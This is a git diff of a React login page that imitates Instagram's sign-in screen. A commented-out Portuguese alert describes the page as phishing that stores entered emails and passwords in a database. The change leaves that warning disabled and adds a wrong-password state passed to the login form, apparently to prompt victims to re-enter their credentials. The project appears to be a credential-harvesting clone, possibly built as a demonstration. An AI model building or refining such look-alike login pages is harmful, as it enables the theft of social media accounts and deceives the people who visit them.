@@ -5,10 +5,11 @@ import Links from "../../Components/Links";
 import Footer from "../../Components/Footer";
 import img from "../../assets/img/imgCelular.png";
 import style from "./PaginaLogin.module.css";
+import { useState } from "react";
 
 const PaginaLogin = () => {
     //   alert("Atenção! isso é um phishing, não coloque sua senha ou email verdadeiro. os dados salvos serão apagados em 1hr mas se você mesmo quiser apagar, o email e senha do banco de dados estará disponivel no readme do github marciomartins12 repositorio instagram")
-
+    const [senhaErrada, setSenhaErrada]= useState(0);
     return (
         <section className={style.section}>
             <div className={style.pc}>
@@ -18,13 +19,17 @@ const PaginaLogin = () => {
                 <div>
                     <div className={style.border}>
                         <h1 className={style.tituloInstagram}>Instagram</h1>
-                        <Formulario />
+                        <Formulario   
+                            senhaErrada={setSenhaErrada}
+                        />
                         <div className={style.divOU}>
                             <div></div>
                             <span>OU</span>
                             <div></div>
                         </div>
-                        <Funcao />
+                        <Funcao
+                            senhaErrada={senhaErrada}
+                        />
                     </div>
                     <div className={style.semConta}>
                         <h6>não tem uma conta? <a href="#">Cadastre-se</a></h6>
